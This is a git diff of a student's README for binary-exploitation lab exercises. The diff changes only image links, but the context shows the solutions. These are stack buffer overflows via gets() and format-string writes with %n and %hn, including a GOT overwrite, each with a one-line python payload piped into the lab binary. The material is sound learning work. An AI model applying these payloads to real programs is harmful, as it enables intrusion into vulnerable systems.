@@ -14,18 +14,18 @@ We can do it like this:
 gdb ./bin     
 disas main
 ```    
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/00_main2.png" width="400" heigth="400" />   
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/00_main2.png" width="400" heigth="400" />   
 
 As we can see the application uses `gets()` function. It can be exploited, because `gets()` doesn't check for buffer overflows.   
 
 We can calculate the buffer size by subtracting (%eax) buffer offset address from end address of the buffer `0x5c - 0x1c = 0x40`    
 So our input needs to be longer than 0x40 (64 in decimal) characters.         
 
-![pic1](https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/00_done.png)  
+![pic1](https://github.com/juss21/Protostar-exploit/raw/master/images/00_done.png)  
 
 ## ex01 
 
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/01_done.png" width="1000" heigth="800" />  
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/01_done.png" width="1000" heigth="800" />  
 
 The program compares input/argument to 0x61626364 (`abcd` based on ascii table from hex value).     
 It expects the input string to be in little-endian format, meaning that the least significant byte is stored first in memory.   
@@ -35,7 +35,7 @@ As the least significant byte is stored first, we need to write out `abcd` in re
 
 ## ex02
 
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/02_done.png" width="1000" heigth="800" />     
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/02_done.png" width="1000" heigth="800" />     
 
 This was pretty much copy-paste from the previous exercise.     
 Only in this one you had to give a correct value to a variable before running the application.  
@@ -49,7 +49,7 @@ Because the task expects little-endian format again, we need to reverse the vari
 
 This exercise was a bit different. There was a hidden `win()` function that you needed to access.   
 This is how I did it:   
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/03_done.png" width="1000" heigth="800"/> 
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/03_done.png" width="1000" heigth="800"/> 
 
 - Search info about all functions in the application, using `info functions` in `gdb` env.
 - Then disassamble the `win()` function to get the correct address.
@@ -60,7 +60,7 @@ This is how I did it:
 
 This was pretty much the same as previous exercise. Only the buffer size was bigger.    
 The return address of the function overwrites the offset value as: `0x50 + 8 + 4 - 0x10 = 0x4C = dec(76)`  
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/04_done.png"/>
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/04_done.png"/>
 - Command used: `python -c "print 'A'*76+'\xf4\x83\x04\x08'" | ./bin`
 
 ## ex05 
@@ -70,7 +70,7 @@ Create a format string that writes 64 characters followed by `deadbeef`, which r
 
 Command: `./bin $(python -c "print 'A'*64+'\xef\xbe\xad\xde'")`
 
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/05_done.png"/>
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/05_done.png"/>
 
 ## ex06
 
@@ -89,7 +89,7 @@ Then jump to `winner()` using the function address:
 -  `jump *0x08048864`
 
 #### Solution:
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/06_done.png"/>
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/06_done.png"/>
 
 ## ex07
 
@@ -101,13 +101,13 @@ When the address is displayed properly. Instead of reading by using `%x`, lets w
 With trial and error I got to the final result.
 
 #### Solution:
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/07_done.png"/>
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/07_done.png"/>
 
 ## ex08
 
 We do the same stuff we did on the previous task. Buffer size is bigger and also the target value is in hex (`0x080484a2 <+59>:	cmp    $0x1025544,%eax`).
 
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/08_info.png"/>   
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/08_info.png"/>   
 
 After getting this information I converted the hex value to decimal and got close enough to the needed value and did a small trial by error. 
 
@@ -115,7 +115,7 @@ After getting this information I converted the hex value to decimal and got clos
 `python -c "print '\xf4\x96\x04\x08' + '%x'*10 + '%16930052x' + '%n'" | ./bin`  
 
 Sadly solution breaks the terminal, so I couldn't include it in the previous pictures:    
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/08_done.png"/>   
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/08_done.png"/>   
 
 ## ex09 
 
@@ -124,10 +124,10 @@ We are going to redirect the execution flow by overwriting the entry for the exi
 After finding the addresses of `hello()` and `exit()`, we need to get the print value of `hello()`.     
 Then we need to overwrite last to bytes of the exit address using this command: `python -c 'print "\x24\x97\x04\x08"+"%33968x%4$hn"' | ./bin`
 
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/09_info.png"/>
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/09_info.png"/>
 
 ### Solution:
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/09_done.png">    
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/09_done.png">    
 
 This solution has terminal spam again but I used the same commands.
 
@@ -139,8 +139,8 @@ After following instructions on the picture, you can see where the `AAAA` (0x414
 and where the `nowinner()` function starts from. We can calculate total bytes needed to fill based on that map.     
 My map had `72` bytes between start and end so final command to pass the exercise is:   
 `./bin $(python -c "print 'A'*72 + '\x64\x84\x04\x08'")`    
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/10_info.png" width="1000" heigth="1000">   
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/10_done.png">   
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/10_info.png" width="1000" heigth="1000">   
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/10_done.png">   
 
 ## ex11 
 
@@ -157,7 +157,7 @@ I used same principles here to get information as in the previous task.
 #### Solution:
 `./bin $(python -c "print 'A'*20 + '\x74\x97\x04\x08'") $(python -c "print '\x94\x84\x04\x08'")`
 
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/11_done.png">   
+<img src="https://github.com/juss21/Protostar-exploit/raw/master/images/11_done.png">   
 
 ##
 ### Author: [Juss](https://01.kood.tech/git/juss)
